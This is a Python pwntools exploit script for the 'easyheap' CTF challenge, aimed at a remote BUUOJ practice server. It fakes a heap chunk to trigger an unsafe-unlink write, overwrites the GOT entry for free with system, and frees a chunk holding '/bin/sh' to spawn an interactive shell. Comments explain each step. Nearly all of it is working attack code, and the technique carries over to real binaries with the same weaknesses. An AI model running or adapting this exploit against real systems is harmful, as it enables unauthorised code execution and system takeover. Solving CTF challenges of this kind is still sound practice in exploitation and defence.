from pwn import *
from LibcSearcher import *

import utils

context.arch = 'amd64'
context.log_level = 'debug'

elf = ELF('../easyheap')

target = remote('node4.buuoj.cn', 29813)

# Utility functions
def allocate(size):
  content = b'a' * size
  target.sendlineafter('choice :', '1')
  target.sendlineafter('Heap :', str(size))
  target.sendafter('heap:', content)
  target.recvuntil('SuccessFul')

def edit(index, size, content):
  target.sendlineafter('choice :', '2')
  target.sendlineafter('Index :', str(index))
  target.sendlineafter('Heap :', str(size))
  target.sendafter('heap : ', content)
  target.recvuntil('Done !')

def free(index):
  target.sendlineafter('choice :', '3')
  target.sendlineafter('Index :', str(index))

free_got = elf.got['free']
system = elf.sym['system']
# get_flag = elf.sym['l33t'] There is no /home/pwn/flag...
heap_array = 0x6020f8
fd = heap_array - 0x18
bk = heap_array - 0x10

# Index will be checked, so no offbyone.
# Heap pointer will be set to 0, so no UAF.
# Partial RELRO means we can modify free_got.
allocate(0x100) # e0 0
allocate(0x100) # e8 1
allocate(0x100) # f0 2
allocate(0x30) # f8 3
allocate(0x80) # 00 4

fake_chunk = (p64(0x0) + p64(0x20) + p64(fd) + p64(bk) +
              p64(0x20)).ljust(0x30, b'a') + p64(0x30) + p64(0x90)
edit(3, len(fake_chunk), fake_chunk)
free(4) # Unlink => 0x6020f8 stores 0x6020e0

# We first write free's got on 0x6020e0 by chunk 3.
payload = p64(free_got)
edit(3, len(payload), payload)

# Then we can modify free_got to system by chunk 0.
payload = p64(system)
edit(0, len(payload), payload)
free(0)

# Write /bin/sh to some other chunks.
payload = b'/bin/sh\x00'
edit(1, 0x8, payload)
free(1) # free(heaparray[1]) => system(&heaparray[1] as str)

target.interactive()